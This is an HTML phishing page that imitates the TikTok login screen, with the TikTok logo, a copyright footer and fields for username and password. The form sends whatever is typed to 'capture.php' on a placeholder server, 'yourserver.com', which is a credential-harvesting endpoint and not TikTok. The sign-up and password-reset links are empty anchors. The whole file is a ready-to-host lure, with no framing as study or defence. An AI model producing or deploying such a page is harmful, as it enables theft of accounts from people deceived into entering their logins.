<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e9/TikTok_logo.svg/2560px-TikTok_logo.svg.png" alt="TikTok Logo">
        </div>
        <form action="http://yourserver.com/capture.php" method="post">
            <input type="text" name="username" placeholder="Phone number, email, or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
        <div class="signup">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="footer">
            <p>Â© 2025 TikTok</p>
        </div>
    </div>
</body>
</html>
